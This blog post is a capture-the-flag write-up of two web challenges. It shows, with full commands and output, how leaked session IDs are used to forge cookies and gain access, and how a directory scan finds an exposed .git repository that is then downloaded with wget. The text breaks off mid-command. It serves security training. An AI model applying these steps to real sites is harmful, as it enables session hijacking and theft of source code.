---
date: 2019-11-30 23:48:05
layout: post
title: CyberTalents - Ainshams University CTF2019
subtitle: "Created by: Mrx-Exploit"
description: >-
  It was very easy Web Challenge.
image: >-
  /assets/img/WebCTF/ainshams/banner.jpg
optimized_image: >-
  /assets/img/WebCTF/ainshams/banner.jpg
category: blog
tags:
  - websec
  - cybertalents
  - rce
author: Hazem Hesham
paginate: true
---

I will solve the web Challenges in this post so there are two challenge select anyone you need and enjoy  

1. [Dark Session](#dark-session)
2. [Broken Doors](#broken-doors)  

# Dark Session

As the usual I will run dirb  but in i found nothing bad luck xD  

So let's see the the source code  

Yes i found brainFuck encryption  

![image](/assets/img/WebCTF/ainshams/1.png)

So let's decode it [dcode.fr](https://www.dcode.fr/brainfuck-language)  

Awsomme we got something looks useful  
```javascript
if(document.cookie !== ''){        $.post('getuserinfo.php',{          'PHPSESSID':document.cookie.match(/PHPSESSID=([^;]+)/)[1](        },function(data){2          cu = data;<        });F      }
```
There are `getuserinfo.php` and it's takes POST data `PHPSESSID= ???`  

So let's see what's inside it  

![image](/assets/img/WebCTF/ainshams/2.png)  

Ahaa it's API Hmmm  

So we need value for PHPSESSID to get the userinfo  

Let's back to `/Dark-Sessions/` and see again on it  

Damn I got this message   
```
Session not found in our secret place , {http://tiny.cc/u16dfz}
```

It's pastbin and there are Secret Sessions
```
#Secret_Sessions#
iuqwhe23eh23kej2hd2u3h2k23
11l3ztdo96ritoitf9fr092ru3
ksjdlaskjd23ljd2lkjdkasdlk
```
So let put it in Cookie and see what will happen  

```bash
GET /Dark-Sessions/ HTTP/1.1
Host: 54.93.122.202
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: ar,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=11l3ztdo96ritoitf9fr092ru3
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```
Shit I got anther message 
```
UserInfo Cookie don't have the username , you need to go deeper... 
```
I think i need to get the username and put it in Cookie too in UserInfo   

So let's try to send the session in the API and let's see what will happen  

![image](/assets/img/WebCTF/ainshams/3.png)

Awsome i got the username it's so easy  

let's put it in the Cookie  

![image](/assets/img/WebCTF/ainshams/4.png)

Woow it's so easy we got the flag
```
Secret_session_gained_succefully
```
# Broken doors

As the usual I will run dirb  

```Bash
root@kali:~/Desktop# dirb http://18.197.166.159/Broken-doors/

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sat Nov 30 12:15:24 2019
URL_BASE: http://18.197.166.159/Broken-doors/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4614

---- Scanning URL: http://18.197.166.159/Broken-doors/ ----
+ http://18.197.166.159/Broken-doors/.git/HEAD (CODE:200|SIZE:23)
^C> Testing: http://18.197.166.159/Broken-doors/_tempalbums
```
Yes I got .git so lets download it

```Bash
root@kali:~/Desktop/cyber# rm .git
root@kali:~/Desktop/cyber# mkdir git
root@kali:~/Desktop/cyber# cd git
root@kali:~/Desktop/cyber/git# wget -r http://18.197.166.159/Broken-doors/.git/
--2019-11-30 10:56:36--  http://18.197.166.159/Broken-doors/.git/
Connecting to 18.197.166.159:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: ‘18.197.166.159/Broken-doors/.git/index.html’

18.197.166.159/Brok     [ <=>                ]   1.39K  --.-KB/s    in 0s

2019-11-30 10:56:36 (71.8 MB/s) - ‘18.197.166.159/Broken-doors/.git/index.html’ saved [1420]

Loading robots.txt; please ignore errors.
--2019-11-30 10:56:36--  http://18.197.166.159/robots.txt
Reusing existing connection to 18.197.166.159:80.
HTTP request sent, awaiting response... 404 Not Found
2019-11-30 10:56:36 ERROR 404: Not Found.

--2019-11-30 10:56:36--  http://18.197.166.159/Broken-doors/
Reusing existing connection to 18.197.166.159:80.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: ‘18.197.166.159/Broken-doors/index.html’

18.197.166.159/Brok     [ <=>                ]   2.47K  --.-KB/s    in 0s

2019-11-30 10:56:36 (5.19 MB/s) - ‘18.197.166.159/Broken-doors/index.html’ saved [2531]

--2019-11-30 10:56:36--  http://18.197.166.159/Broken-doors/.git/branches/
```
```Bash
root@kali:~/Desktop/cyber/git/18.197.166.159# cd Broken-doors/
root@kali:~/Desktop/cyber/git/18.197.166.159/Broken-doors# ls
index.html
root@kali:~/Desktop/cyber/git/18.197.166.159/Broken-doors# ls -la
total 16
drwxr-xr-x 3 root root 4096 Nov 30 10:56 .
drwxr-xr-x 3 root root 4096 Nov 30 10:56 ..
drwxr-xr-x 8 root root 4096 Nov 30 10:56 .git
-rw-r--r-- 1 root root 2531 Nov 30 10:56 index.html
root@kali:~/Desktop/cyber/git/18.197.166.159/Broken-doors# cd .git
root@kali
```